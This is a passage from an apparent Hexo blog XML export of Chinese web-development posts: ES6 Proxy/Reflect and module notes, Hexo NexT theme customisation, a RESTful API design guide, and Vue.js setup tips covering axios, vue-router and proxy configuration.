setTimeout(resolve, 500, &quot;one&quot;); }); var p2 = new Promise(function(resolve, reject) { setTimeout(resolve, 100, &quot;two&quot;); }); Promise.race([p1, p2]).then(function(value) { console.log(value);// &quot;two&quot; // 两个都完成,但 p2 更快 }); 有趣的是如果你使用 ES6 的 class,你是可以去派生 Promise 的,就像我们想派生 Array 一样：class MePromise extends Promise { // 处理 ... } 那么,除了 Promise 还有没有更牛逼的方案？这是有的,目前的异步编程已经从最初的 callback 进化到了如下的顺序。callback -&gt; Promise -&gt; generator -&gt; async await未来,肯定属于 async await 了。代理和反射这两个 API 在实际的业务场景中几乎非常少的使用,至于具体的场景可能还需要大家来挖掘了。看起来每一个 API 都有一些其他的 API 可模拟,可使用,它们具体的内涵就是在于拦截,执行,返回结果。Proxy（代理）从字面上来看,这应该很好理解,就像 nginx 一样,将请求代理。我们来看一个非常小的例子：let handler = { get: function(target, name) { return name in target ? target[name] : 37; } }; let p = new Proxy({}, handler); p.a = 1; p.b = undefined; console.log(p.a, p.b); // 1, undefined console.log(&quot;c&quot; in p, p.c); 通过 new Proxy 来创建一个自定义的行为,handler 做为捕获器可以捕获对象操作的行为。这一点上,其实和 Object.defineProperty 来创建一个 get,set 方法非常像。由于 b 已经存在,所以返回的是 undefined,当我们打印 c 时,p.c 就会返回 37。有兴趣的话,可以仔细阅读：ProxyReflectReflect（反射）其实也和 Proxy 的作用非常类似,它提供的是拦截操作 JavaScript 的方法,唯一和代理不同的是,Reflect 提供的是静态方法,无法使用 new 运算符。获取一个属性：let obj = { a: 1 }; console.log(Reflect.get(obj, &quot;a&quot;)); 设置一个属性：let obj = {}; Reflect.set(obj, &quot;prop&quot;, &quot;value&quot;);// true obj.prop;// &quot;value&quot; 对函数进行调用：Reflect.apply(Math.floor, undefined, [1.75]); 这和函数的 apply 唯一不同的是第一个参数必须是要调用的函数,后两个参数与函数的 apply 保持一致。更多的方法,有兴趣的话可以阅读：Reflect说实话,这两个 API 的应用场景,其实我也有些糊涂,可能要经常使用,比对,才能发现比之对应有相同功能的方法的区别。使用模块封装代码不知不觉《深入理解 ES6》阅读笔记就写到了最后一篇,完结之后可能会开启另外的一个系列,分享自己的知识点,让阅读到的人有一点点的收获,以及自己的成长。最后一篇主要是来写一写用模块封装代码的事情,回顾历史,从最早的立即执行函数,再到 require.js,以及 commonjs,今天我们面对的是语言标准给我们带来的模块化方案。如果说模块,我们应该可以从字面的意思上来看,这是一种可以自动运行在严格模式下并且没有办法退出的代码块。这种代码块在作用域上可以避免互相之间的污染,以及更好的组织代码运行。模块语法ES6 定义了一对非常简单的关键字来描述模块的导入和导出,在此之间,又为了方便而定义了一些导出导入的方式。import from export 基本的导出,我们可以用 export 来将函数暴露出去：export function a() {} 当然这样的方式,也可以导出类,对象,变量等。有了导出,自然会有导入：// 假设a.js export function a() {} // b.js使用a.js import { a } from &quot;a.js&quot;; a(); 这样,也就构成了 ES6 的模块系统。除此之外,整个模块系统给了我们很多其他的方式来操作,比如导出一个默认的函数：// a.js export default function a() {} // b.js import a from &quot;a.js&quot;; 如果可以,我想给 a 起一个别名：// a.js export function a() {} import * as query from &quot;a.js&quot;; 当然了,我们也可以导出多个函数：export function a() {} export function b() {} import { a, b } from &quot;a.js&quot;; 至于其他的用法,有兴趣的朋友,可以阅读一下 export 和 import 。在浏览器中不借助 webpack 这样的工具也可以使用模块系统,只需要将 type=module,这个模块需要注意的,可能就是关于路径的问题了,其他都和 export import 一样。]]></content>
      <categories>
        <category>ES6</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo+NexT 进阶设置]]></title>
    <url>%2Farchives%2F6232b20b.html</url>
    <content type="text"><![CDATA[HEXO 博客最近大更新,页面与之前大不相同,这里跟大家分享一下相关的设置方法highlight.jshighlightjs 官方网站Next 自带的代码高亮并不符合我的口味,所以就采用了第三方的 highlight.jsUse先禁用默认的高亮方式编辑配置文件./_config.ymlhighlight: enable: false line_number: true autoi_detect: true tab_replace: 引入第三方 highlight编辑主题源文件./themes/layout/_layout.swing注意这边需要引入样式,相关的样式以及支持的语言请查看 176 languages and 79 styles因为个人比较喜欢 Atom 这款编辑器,改编辑器用默认的样式为 atom-one-dark,所以这里采用该样式&lt;link rel=&quot;stylesheet&quot; href=&quot;//cdn.bootcss.com/highlight.js/9.12.0/styles/atom-one-dark.min.css&quot;&gt; 除了引入样式,还需初始化 highlightjs,这里提供的代码是可以显示行号的&lt;script src=&quot;//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(function() { hljs.initHighlighting(); $(&#39;pre code&#39;).each(function() { var lines = $(this).text().split(&#39;\n&#39;).length - 1; var $numbering = $(&#39;&lt;ul/&gt;&#39;).addClass(&#39;pre-numbering&#39;); $(this) .addClass(&#39;has-numbering&#39;) .parent() .append($numbering); for (i = 1;i &lt;= lines;i++) { $numbering.append($(&#39;&lt;li/&gt;&#39;)); } }); }); &lt;/script&gt; 可以看到以上的代码是有添加 class 样式的,所以还需补上相关的样式表,以下的样式表在小分辨率的情况下行号是不显示出来的,优化效果请参照本博客代码高亮区块&lt;style&gt; pre { position: relative; padding: 0; } code.has-numbering { margin-left: 2.5rem; } code.has-numbering::-webkit-scrollbar { display: none; } .pre-numbering { margin: 0; position: absolute; top: 0; display: flex; flex-direction: column; justify-content: center; height: 100%; } .pre-numbering li { list-style-type: decimal-leading-zero !important; } @media (max-width: 760px) { .post-body pre { padding: 0px; } .post-body .pre-numbering { display: none; } code.has-numbering { margin: 0; } } &lt;/style&gt; Copy&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.1/clipboard.min.js&quot;&gt;&lt;/script&gt; 这边不就贴关键代码了,,请移步 clipboard.js _layout.swig优化 blockquote默认的引用 blockquote 样式比较丑,写了一些样式优化它,优化效果请参照本博客的引用区块编辑主题源文件./themes/layout/_layout.swing&lt;style&gt; blockquote { color: #888; background-color: #eae6f3; border-left: 1rem solid #5236a0; padding: 0 1.5rem; position: relative; font-family: &#39;Roboto&#39;, sans-serif; } blockquote:before, blockquote:after { color: #392570; font-size: 2.5rem; position: absolute; line-height: 2.5rem; } blockquote:before { content: &quot;\201C&quot;; left: -1rem; top: 0; } blockquote:after { content: &quot;\201D&quot;; right: 0; bottom: -1rem; } &lt;/style&gt; 网站已运行时间编辑主题源文件./themes/layout/_parrials/footer.swing找到以下代码区块{% if theme.footer.theme.enable %} /* ... */ {% endif %} 在 &lt;/div&gt; 之前添加&lt;span&gt; | &lt;/span&gt; &lt;span id=&quot;showDays&quot;&gt;&lt;/span&gt; 在该文件末尾处添加&lt;script&gt; var seconds = 1000; var minutes = seconds * 60; var hours = minutes * 60; var days = hours * 24; var years = days * 365; var birthDay = Date.UTC(2016,07,30,00,00,00);// 这里设置建站时间 setInterval(function() { var today = new Date(); var todayYear = today.getFullYear(); var todayMonth = today.getMonth()+1; var todayDate = today.getDate(); var todayHour = today.getHours(); var todayMinute = today.getMinutes(); var todaySecond = today.getSeconds(); var now = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond); var diff = now - birthDay; var diffYears = Math.floor(diff/years); var diffDays = Math.floor((diff/days)-diffYears*365); var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours); var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes); var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds); document.getElementById(&#39;showDays&#39;).innerHTML=&quot;本站已运行 &quot;+diffYears+&quot; 年 &quot;+diffDays+&quot; 天 &quot;+diffHours+&quot; 小时 &quot;+diffMinutes+&quot; 分钟 &quot;+diffSeconds+&quot; 秒&quot;; }, 1000); &lt;/script&gt; 开启页面动画效果编辑主题配置文件./themes/_config.yml# Canvas-nest canvas_nest: true vendors: # Internal version: 1.0.0 # https://github.com/hustcc/canvas-nest.js canvas_nest: //cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js 新的评论系统自从多说和网易云跟帖都挂了之后,Next 官方引入了 Valine 这一款评论系统关于 Valine 的介绍请移步 Valine — 一款极简的评论系统,配置中出现 leancloud application appid 和 leancloud application appkey 获取方法也请看此链接相关的配置指南 https://valine.js.org/我的配置编辑主题配置文件./themes/_config.yml# Valine. # You can get your appid and appkey from https://leancloud.cn # more info please open https://github.com/xCss/Valine valine: enable: true appid: # your leancloud application appid appkey: # your leancloud application appkey notify: false # mail notifier , https://github.com/xCss/Valine/wiki verify: false # Verification code placeholder: ヾﾉ≧∀≦)o 亲爱的小主,有何指教 使用最新的 Valine修改主题源码文件./themes/layout/_third-party/comments/valine.swig&lt;script src=&quot;//unpkg.com/valine/dist/Valine.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; new Valine({ av: AV, el: &#39;#comments&#39; , app_id: &#39;{{ theme.valine.appid }}&#39;, app_key: &#39;{{ theme.valine.appkey }}&#39;, placeholder: &#39;{{ theme.valine.placeholder }}&#39;, // 默认 null notify: {{ theme.valine.notify }}, // 默认 false verify: {{ theme.valine.verify }}, // 默认 false path: {{ theme.valine.path }}, // 默认 window.location.pathname avatar: &#39;{{ theme.valine.avatar }}&#39; // 默认 &#39;&#39; }); &lt;/script&gt;]]></content>
      <categories>
        <category>node.js</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
        <tag>Node.js</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTful API 设计指南（补充）]]></title>
    <url>%2Farchives%2F9cbc428.html</url>
    <content type="text"><![CDATA[网络应用程序,分为前端和后端两个部分。这时候必须有一种统一的机制,方便不同的前端设备与后端进行通信。这导致 API 构架的流行,甚至出现 “API First” 的设计思想。RESTful API 是目前比较成熟的一套互联网应用程序的 API 设计理论先言该篇博文为补充 RESTful API 设计指南- 阮一峰的网络日志RESTful API 设计参考文献列表,可帮助你更加彻底的了解REST风格的接口设计。REST API一般用来将某种资源和允许的对资源的操作暴露给外界,使调用者能够以正确的方式操作资源。这里,在输入输出的处理上,要符合HTTP/1.1（不久的将来,要符合HTTP/2.0）的RFC,保证接口的一致性。协议API 与用户的通信协议,总是使用 https 协议。域名应该尽量将 API 部署在专用域名之下。https://api.example.com如果确定 API 很简单,不会有进一步扩展,可以考虑放在主域名下。https://example.org/api/版本（Versioning）应该将 API 的版本号放入 URL。https://api.example.com/v1/另一种做法是,将版本号放在 HTTP 头信息中,但不如放入 URL 方便和直观。Github 采用这种做法。路径（Endpoint）路径又称”终点”（endpoint）,表示 API 的具体网址。 在 RESTful 架构中,每个网址代表一种资源（resource）,所以网址中不能有动词,只能有名词,而且所用的名词往往与数据库的表格名对应。一般来说,数据库中的表都是同种记录的”集合”（collection）,所以 API 中的名词也应该使用复数。 举例来说,有一个 API 提供动物园（zoo）的信息,还包括各种动物和雇员的信息,则它的路径应该设计成下面这样。https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/employees、RESTful API 规范URI 请求采用小写字母,数字,部分特殊符号（非制表符,该特殊符号特指 _、&amp;、?）组成。URI 请求中不采用大小写混合的驼峰命名方式,尽量采用全小写单词,如果需要连接多个单词,则采用连接符_连接单词URI 中不包含文件名,例如 /api/test.phpURI 中不包含 HTTP 动词,动作由请求包体中的 method 决定,语义化能够一眼看出当前的操作URI 不能过长,任何 HTTP 协议客户端和服务器都应当支持 8000 字节的首行（方法名 + URI + HTTP 版本号）,可以理解成支持 7980+ 字节的 URI非 ID 形式的全部通过使用 ? 传参形式,并且使用 encodeURI 或者 encodeURIComponent 进行编码使用复数形式的单词表示大量的数据,例如 /api/users根据需求添加 版本号,例如 /api/v1/users根据需求添加 SecretKey,特指某些对外服务盈利的接口过深的导航容易导致url膨胀,不易维护,如 GET /zoos/1/areas/3/animals/4,尽量使用查询参数代替路径中的实体导航,如GET /animals?zoo=1&amp;area=3对于一些需要用户验证的查用 OAuth 或者 JWT,并且添加 HTTP Authorization 请求头关于 Content-Type 采用 application/json;charset=UTF-8 或者 application/x-www-form-urlencoded;charset=UTF-8HTTP 动词对于资源的具体操作类型,由 HTTP 动词表示。 常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令）。GET（SELECT） =&gt; 从服务器取出资源（一项或多项）。POST（CREATE） =&gt; 在服务器新建一个资源。PUT（UPDATE） =&gt; 在服务器更新资源（客户端提供改变后的完整资源）。PATCH（UPDATE） =&gt; 在服务器更新资源（客户端提供改变的属性）。DELETE（DELETE） =&gt; 从服务器删除资源。还有两个不常用的 HTTP 动词。HEAD =&gt; 获取资源的元数据。OPTIONS =&gt; 获取信息,关于资源的哪些属性是客户端可以改变的。下面是一些例子。GET /zoos =&gt; 列出所有动物园POST /zoos =&gt; 新建一个动物园GET /zoos/ID =&gt; 获取某个指定动物园的信息PUT /zoos/ID =&gt; 更新某个指定动物园的信息（提供该动物园的全部信息）PATCH /zoos/ID =&gt; 更新某个指定动物园的信息（提供该动物园的部分信息）DELETE /zoos/ID =&gt; 删除某个动物园GET /zoos/ID/animals =&gt; 列出某个指定动物园的所有动物DELETE /zoos/ID/animals/ID =&gt; 删除某个指定动物园的指定动物过滤信息（Filtering）如果记录数量很多,服务器不可能都将它们返回给用户。AP I 应该提供参数,过滤返回结果。 下面是一些常见的参数。?limit=10 =&gt; 指定返回记录的数量?offset=10 =&gt; 指定返回记录的开始位置。?page=2&amp;per_page=100 =&gt; 指定第几页,以及每页的记录数。?sortby=nameℴ=asc =&gt; 指定返回结果按照哪个属性排序,以及排序顺序。?animal_type_id=1 =&gt; 指定筛选条件参数的设计允许存在冗余,即允许 API 路径和 URL 参数偶尔有重复。比如,GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的。状态码（Status Codes）服务器向用户返回的状态码和提示信息,常见的有以下一些（方括号中是该状态码对应的 HTTP 动词）。请求成功200 OK -&gt; 【GET】 =&gt; 服务器成功返回用户请求的数据,该操作是幂等的（Idempotent）。201 CREATED -&gt; 【POST/PUT/PATCH】 =&gt; 对象创建成功并返回相应资源数据,如 POST 成功；创建完成后响应头中应该携带头标 Location ,指向新建资源的地址202 Accepted -&gt; 【*】 =&gt; 接受请求,但无法立即完成创建行为,比如其中涉及到一个需要花费若干小时才能完成的任务。返回的实体中应该包含当前状态的信息,以及指向处理状态监视器或状态预测的指针,以便客户端能够获取最新状态。204 No Content -&gt; 【DELETE/PATCH】 =&gt; 请求执行成功,不返回相应资源数据重定向重定向的新地址都需要在响应头 Location 中返回301 Moved Permanently -&gt; 【*】 =&gt; 被请求的资源已永久移动到新位置302 Found -&gt; 【*】 =&gt; 请求的资源现在临时从不同的 URI 响应请求303 See Other -&gt; 【*】 =&gt; 应当前请求的响应可以在另一个 URI 上被找到,客户端应该使用 GET 方法进行请求。比如在创建已经被创建的资源时,可以返回 303307 Temporary Redirect -&gt; 【*】 =&gt; 对应当前请求的响应可以在另一个 URI 上被找到,客户端应该保持原有的请求方法进行请求条件请求304 Not Modified -&gt; 【GET/HEAD】 =&gt; 未改变说明无需再次传输请求的内容,也就是说可以使用缓存的内容。这通常是在一些安全的方法（safe）,资源自从上次请求后没有再次发生变化,主要使用场景在于实现数据缓存409 Conflict -&gt; 【GET/HEAD】 =&gt; 请求操作和资源的当前状态存在冲突。主要使用场景在于实现并发控制412 Precondition Failed -&gt; 【GET/HEAD】 =&gt; 服务器在验证在请求的头字段中给出先决条件时,没能满足其中的一个或多个。主要使用场景在于实现并发控制客户端错误400 Bad Request -&gt; 【POST/PUT/PATCH】 =&gt; 请求体包含语法错误,用户发出的请求有错误,服务器没有进行新建或修改数据的操作,该操作是幂等的。401 Unauthorized -&gt; 【*】 =&gt; 表示用户没有权限（令牌、用户名、密码错误）。需要验证用户身份,如果服务器就算是身份验证后也不允许客户访问资源,应该响应 403 Forbidden 。如果请求里有 Authorization 头,那么必须返回一个 WWW-Authenticate 头403 Forbidden -&gt; 【*】 =&gt; 服务器拒绝执行,表示用户得到授权（与 401 错误相对）,但是访问是被禁止的。404 Not Found -&gt; 【*】 =&gt; 用户发出的请求针对的是不存在的记录,服务器没有进行操作,该操作是幂等的。406 Not Acceptable -&gt; 【GET】 =&gt; 用户请求的格式不可得（比如用户请求 JSON 格式,但是只有 XML 格式）。服务器不支持客户端请求的内容格式,但响应里会包含服务端能够给出的格式的数据,并在 Content-Type 中声明格式名称410 Gone -&gt; 【GET】 =&gt; 用户请求的资源被永久删除,且不会再得到的。被请求的资源已被删除,只有在确定了这种情况是永久性的时候才可以使用,否则建议使用 404 Not Found413 Payload Too Large -&gt; 【POST/PUT】=&gt; POST 或者 PUT 请求的消息实体过大415 Unsupported Media Type -&gt; 【GET】=&gt; 服务器不支持请求中提交的数据的格式422 Unprocessable Entity -&gt; 【POST/PUT/PATCH】=&gt; 请求格式正确,但是由于含有语义错误,无法响应428 Precondition Required -&gt; 【GET】 =&gt; 要求先决条件,如果想要请求能成功必须满足一些预设的条件服务端错误500 INTERNAL SERVER ERROR -&gt; 【*】 =&gt; 服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。501 Not Implemented -&gt; 【*】 =&gt; 服务器不支持当前请求所需要的某个功能。502 Bad Gateway -&gt; 【*】 =&gt; 作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。503 Service Unavailable -&gt; 【*】 =&gt; 由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。状态码的完全列表参见这里。错误处理（Error handling）不要发生了错误但给2xx响应,客户端可能会缓存成功的http请求；正确设置http状态码,不要自定义；Response body 提供 1) 错误的代码（日志/问题追查）；2) 错误的描述文本（展示给用户）。如果状态码是 4xx,就应该向用户返回出错信息。一般来说,返回的信息中将 error 作为键名,出错信息作为键值即可。业务类异常必须提供2种信息：如果抛出该类异常,HTTP 响应状态码应该设成什么；异常的文本描述；在Controller层使用统一的异常拦截器：设置 HTTP 响应状态码：对业务类异常,用它指定的 HTTP code；对非业务类异常,统一500；Response Body 的错误码：异常类名Response Body 的错误描述：对业务类异常,用它指定的错误文本；对非业务类异常,线上可以统一文案如“服务器端错误,请稍后再试”,开发或测试环境中用异常的 stacktrace,服务器端提供该行为的开关。返回结果针对不同操作,服务器向用户返回的结果应该符合以下规范。Get /collection =&gt; 返回资源对象的列表（数组）Get /collection/resource =&gt; 返回单个资源对象POST /collection =&gt; 返回新生成的资源对象PUT /collection/resource =&gt; 返回完整的资源对象PATCH /collection/resource =&gt; 返回完整的资源对象DELETE /collection/resource =&gt; 返回一个空文档Hypermedia APIRESTful API 最好做到 Hypermedia,即返回结果中提供链接,连向其他 API 方法,使得用户不查文档,也知道下一步应该做什么。 比如,当用户向 api.github.com 的根目录发出请求,会得到这样一个文档。{ &quot;link&quot;: { &quot;rel&quot;: &quot;collection https://www.example.com/zoos&quot;, &quot;href&quot;: &quot;https://api.example.com/zoos&quot;, &quot;title&quot;: &quot;List of zoos&quot;, &quot;type&quot;: &quot;application/vnd.yourformat+json&quot; } } 上面代码表示,文档中有一个 link 属性,用户读取这个属性就知道下一步该调用什么 API 了。rel 表示这个 API 与当前网址的关系（collection 关系,并给出该 collection 的网址）,href 表示 API 的路径,title 表示 API 的标题,type 表示返回类型。Hypermedia API 的设计被称为 HATEOAS。Github 的 API 就是这种设计,访问 api.github.com 会得到一个所有可用 API 的网址列表。{ &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;, &quot;authorizations_url&quot;: &quot;https://api.github.com/authorizations&quot; } 从上面可以看到,如果想获取当前用户的信息,应该去访问 api.github.com/user,然后就得到了下面结果。{ &quot;message&quot;: &quot;Requires authentication&quot;, &quot;documentation_url&quot;: &quot;https://developer.github.com/v3&quot; } 上面代码表示,服务器给出了提示信息,以及文档的网址。其他（1）API 的身份认证应该使用 OAuth 2.0 框架。（2）服务器返回的数据格式,应该尽量使用 JSON,避免使用 XML。]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>Criterion</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js 填坑笔记]]></title>
    <url>%2Farchives%2F68fd47cc.html</url>
    <content type="text"><![CDATA[记录一些使用 vue-cli 脚手架创建项目时,遇到的一些问题以及解决方案vue 1.x 升级到 vue 2.x首先需要安装 vue-migration-helper CLI 工具：控制台运行命令： npm install --global vue-migration-helper CLI 工具来帮助项目从 Vue 1.x 迁移到 2.x。 它扫描文件以查找特定于 Vue 的代码,并对需要升级的代码提供详细的警告。 vue-migration-helper 的介绍说明告诉我们它大概能捕获 80% 的升级帮助信息,而不是全部。所以终端输出的帮助信息并不是完全正确的,在升级时不要盲目 copy &amp; paste ,还是要根据实际情况去改写。进入当前的项目：运行： vue-migration-helper具体升级指南,请参照官方文档-从 Vue 1.x 迁移给与 Windows 用户的一条强烈建议Windows 在执行 npm install 期间遇到关于 node-gyp 的错误,那么你很有可能没有在你的系统上安装正确的构建工具。构建工具包括 Python 和 Visual Studio 等等。使用 windows-build-tools 来为我们完成大部分烦人的工作。全局安装此工具将依次设置 Visual C++ 软件包、Python 等等npm install --global --production windows-build-tools 执行上条命令时注意以管理员权限开启一个 PowerShell 来执行该条命令,因为自动化工具会自动的添加一些 PATH 变量如果是 Windows 7 系统,还需要安装 .NET Framework 4.5.1还有一些更加恶心的报错信息通常是因为墙的原因,这里建议安装 nrm来随时切换软件源npm -g nrm nrm use taobao 以下这几种软件源可供选择,默认使用 npm 官方软件源* npm ---- https://registry.npmjs.org/ cnpm --- http://r.cnpmjs.org/ taobao - https://registry.npm.taobao.org/ nj ----- https://registry.nodejitsu.com/ rednpm - http://registry.mirror.cqupt.edu.cn/ npmMirror https://skimdb.npmjs.com/registry/ edunpm - http://registry.enpmjs.org/ 设置代理与跨域开发时设置如果你的后端 API 服务是 Express 提供或者是 Thinkjs 再或者是 koa2 等等,当你请求数据时就会面临着跨域请求问题执行 npm run dev,你会发现会报一个错误：vue-resource.common.js?e289:1071 POST http://localhost:8080/api/use... 404 (Not Found)。这是由于直接访问 8080 端口,是访问不到的,所以这里需要设置一下代理转发映射.项目根目录下的 config 文件夹中有一个 proxyTable 参数,用来设置地址映射表,可以添加到开发时配置（dev）中|-- config |-- dev.env.js |-- index.js |-- prod.env.js config/index.jsdev: { // ... proxyTable: { &#39;/api&#39;: { target: &#39;http://127.0.0.1:3000/api/&#39;, changeOrigin: true, pathRewrite: { &#39;^/api&#39;: &#39;&#39; } } }, // ... } 添加以上代码之后,请求 /api 时就代表 http://127.0.0.1:3000/api/(这里要写 ip,不要写 localhost), changeOrigin 参数接收一个布尔值,如果为 true,这样就不会有跨域问题了。更多接口参数配置,请参考 https://github.com/chimurai/http-proxy-middleware#optionswebpack 接口配置文档 https://webpack.js.org/configuration/dev-server/#devserver-proxy正式上线时设置|-- src |-- axios |-- index.js |-- config.js 正式上线时,不推荐使用上一个方案,这里推荐使用 axios 进行转发src/config.jsexport default { serverUrl: &quot;http://127.0.0.1:3000/&quot; }; src/axios/index.jsimport axios from &quot;axios&quot;; import config from &quot;@/config&quot;; // 设置全局 axio s默认值 axios.defaults.baseURL = config.serverUrl; axios.defaults.timeout = 5000;// 5000的超时验证 axios.defaults.headers.post[&quot;Content-Type&quot;] = &quot;application/jsoncharset=UTF-8&quot;; // 创建一个 axios 实例 const instance = axios.create(); instance.defaults.headers.post[&quot;Content-Type&quot;] = &quot;application/jsoncharset=UTF-8&quot;; axios.interceptors.request.use = instance.interceptors.request.use; export async function postDate(username, password) { try { const response = await fetch.post(&quot;/postDate&quot;, { username, password }); return response.data; } catch (err) { console.log(&quot;message&quot;, err); if (err.response) { throw Error(err.response.data.message); } throw err; } } 父子组件|-- src |-- components |-- HerderBar.vue |-- FooterBar.vue |-- pages |-- Home.vue 假如你的 components 目录下有 HerderBar.vue 和 FooterBar.vue 这两个子组件,而 Home.vue 要引用这两组件,那么下面这种写法可以完成该需求src/pages/Home.vue&lt;template&gt; &lt;div&gt; &lt;header-bar&gt;&lt;/header-bar&gt; &lt;!-- ... ... --&gt; &lt;footer-bar&gt;&lt;/footer-bar&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import HeaderBar from &#39;@/components/HeaderBar&#39; import FooterBar from &#39;@/components/FooterBar&#39; export default { name: &#39;Home&#39;, components: { HeaderBar, FooterBar } } &lt;/script&gt; 图标库市面上用的比较广泛的图标库有两个,一是阿里巴巴矢量图标库,其有上百万图标共程序员选择,自定义比较强；二是Font Awesome,该图标库虽没有上百万图标,但也受到大部门程序员喜爱。很多人在写 Vue 项目时,前端 UI 框架都喜欢使用 Element UI,但是该 UI 框架默认提供的图标库实现是少之又少,但是该 UI 框架允许我们引入第三方图标库iconfont这个引入就非常简单了,在 iconfont 网站上有提供离线版和在线版,看自己的意愿,然后在 index.html 里使用 style 标签引入即可。fontawesome参考代码element-font-awesome使用 less 时,别忘了安装 npm 依赖npm install -S less less-loader 目录结构|-- src |-- font.less |-- main.js src/main.jsimport &quot;./font.less&quot;; src/font.less[class^=&quot;el-icon-fa&quot;], [class*=&quot; el-icon-fa&quot;] { display: inline-block; font: normal normal normal 14px/1 FontAwesome!important; font-size: inherit; text-rendering: auto; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }; @import url(&quot;../node_modules/font-awesome/less/font-awesome&quot;); @fa-css-prefix: el-icon-fa; sass对于 css 的预编译器,个人比较喜欢 sass 的,在使用 sass 时仍然需要添加 npm 依赖npm install --save node-sass sass-lodaer 目录结构|-- src |-- assets |-- scss |-- _public.scss |-- index.scss |-- App.vue src/App.vue&lt;style lang=&quot;scss&quot;&gt; @import &#39;./assets/scss/index&#39;; &lt;/style&gt; &lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: &#39;app&#39; } &lt;/script&gt; src/assets/scss/index.scss@import &quot;public&quot;; src/assets/scss/public.scss#app { font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;微软雅黑&quot;, Arial, sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; } vuex目录结构|-- src |-- store |-- modules |-- ... ... |-- actions.js # 根级别的 action =&gt; |-- getters.js # 根级别的 mutation =&gt; |-- index.js # 我们组装模块并导出 store 的地方 |-- types.js # 根级别的 type =&gt; 状态 |-- main.js src/main.jsimport Vue from &quot;vue&quot;; import App from &quot;./App&quot;; import store from &quot;./store&quot;; Vue.config.productionTip = false; /* eslint-disable no-new */ new Vue({ el: &quot;#app&quot;, store, template: &quot;&lt;App/&gt;&quot;, components: { App } }); vue-router目录结构|-- router |-- axios |-- index.js |-- main.js src/main.jsimport Vue from &quot;vue&quot;; import App from &quot;./App&quot;; import router from &quot;./router&quot;; Vue.config.productionTip = false; /* eslint-disable no-new */ new Vue({ el: &quot;#app&quot;, router, template: &quot;&lt;App/&gt;&quot;, components: { App } }); HTML5 History 模式下面这一代码片段是使用 vue-cli 下载的模板写法,但是这种写法会使你的 URL 变成 http://localhost:8080/#/import Vue from &quot;vue&quot;; import Router from &quot;vue-router&quot;; // ... ... Vue.use(Router); export default new Router({ routes: [ { path: &quot;/&quot; // ... ... } ] }); 对于强迫症的人来说,这样的 URL 非常丑,这就需要开启 HTML5 History 模式,更具体的说明请看官方文档 vue-router HTML5 History 模式router/index.jsimport Vue from &quot;vue&quot;; import Router from &quot;vue-router&quot;; // ... ... Vue.use(Router); const router = new VueRouter({ mode: &quot;history&quot;, routes: [ { path: &quot;/&quot; // ... ... } ] }); export default router; 路由拦截对于进入某些页面需要进行登录验证,那么就需要设置路由拦截,vue-router 官方文档称之为导航钩子,具体请看官方文档 vue-router 导航钩子实际上在进行路由拦截时需要进行数据验证,当验证通过时方能允许其通过该路由,该验证数据通常会存储在 vuex 的 state 中,或者会存储在 Local Storage,再或者 Session Storage,无论存储在哪里,vue-router 配置文件能够正确访问到即可,当然验证程序就需要后端服务 API 提供了router/index.jsimport Vue from &quot;vue&quot;; import Router from &quot;vue-router&quot;; import store from &quot;@/store&quot;; // ... ... Vue.use(Router); const router = new VueRouter({ mode: &quot;history&quot;, routes: [ { path: &quot;/&quot;, // ... ... meta: { requireAuth: true // 添加该字段,表示进入这个路由是需要进行验证的 } } ] }); router.beforeEach((to, from, next) =&gt; { if (to.matched.some(r =&gt; r.meta.requireAuth)) { // 判断该路由是否需要登录权限 if (store.state.token) { // 通过 vuex state 获取当前的 token 是否存在 next(); } else { next({ path: &quot;/login&quot;, // 验证失败,将会跳转到该路由 query: { redirect: to.fullPath } // 将跳转的路由 path 作为参数,登录成功后跳转到该路由 }); } } else { next(); } }); export default router; axios自从 Vue.js 更新至 2.x 版本之后,官方就不再使用 vue-resource,替而代之的是 axios目录结构|-- src |-- axios |-- index.js |-- pages |-- Home.vue |-- main.js src/main.jsimport Vue from &quot;vue&quot;; import App from &quot;./App&quot;; import api from &quot;./axios&quot;; Vue.prototype.$api = api; Vue.config.productionTip = false; /* eslint-disable no-new */ new Vue({ el: &quot;#app&quot;, template: &quot;&lt;App/&gt;&quot;, components: { App } }); axios 拦截使用 vue-router 进行路由拦截是不够的,当然也是需要数据验证的,更加详细的说明以及例子请移步 【vue+axios】一个项目学会前端实现登录拦截axios/index.jsimport axios from &quot;axios&quot;; import store from &quot;../store&quot;; import router from &quot;../router&quot;; // 设置全局axios默认值 axios.defaults.timeout = 5000;// 5000的超时验证 axios.defaults.headers.post[&quot;Content-Type&quot;] = 